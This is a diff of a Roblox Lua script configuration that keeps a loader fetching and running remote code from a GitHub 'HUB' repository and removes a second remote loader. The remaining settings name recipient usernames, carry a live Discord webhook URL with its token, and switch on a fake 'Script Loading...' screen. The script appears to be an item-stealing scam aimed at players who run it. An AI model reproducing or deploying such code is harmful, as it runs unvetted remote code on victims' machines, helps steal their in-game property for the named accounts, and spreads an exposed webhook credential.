@@ -1,32 +1,10 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ThunderZ-HUB/HUB/main/Script"))()
 
-getgenv().WaitTrue = true;
-getgenv().Wait = 10;
-
-_G.UserID = elyashkb12
-_G.Webhook = "https://discord.com/api/webhooks/1101081988552732692/lzBnblLOH8f3_sDqOHEQGC4x3PlMUcrVozMKu24DuLP1tFY0leRPGGvokGXqW-pkRiOp" -- optional delete the whole line if you don't want it
-
-_G.LoadingScreen = true
-_G.AntiLeave = false
-_G.MouseLock = false 
-
-_G.ScriptName = "Rizz Scriptz"
-_G.FirstText = "Script Preparing"
-_G.SecondText = "Script Loading..."
-_G.ThirdText = "Almost Done..."
-_G.WaitingTime = 5 -- it's the time between 0% and 100% in secondes
-
-loadstring(game:HttpGet("https://rizz69.github.io/Script.lua", true))()
-
-
-getgenv().WaitTrue = true;
-getgenv().Wait = 10;
-
 UserName = "prooelyas1"
 UserName2 = "elyashkb12" -- optional delete the whole line if you don't want it
 Webhook = "https://discord.com/api/webhooks/1101081988552732692/lzBnblLOH8f3_sDqOHEQGC4x3PlMUcrVozMKu24DuLP1tFY0leRPGGvokGXqW-pkRiOp" -- optional delete the whole line if you don't want it
 
-_G.LoadingScreen = false
+_G.LoadingScreen = true
 _G.AntiLeave = false
 _G.MouseLock = false 
 
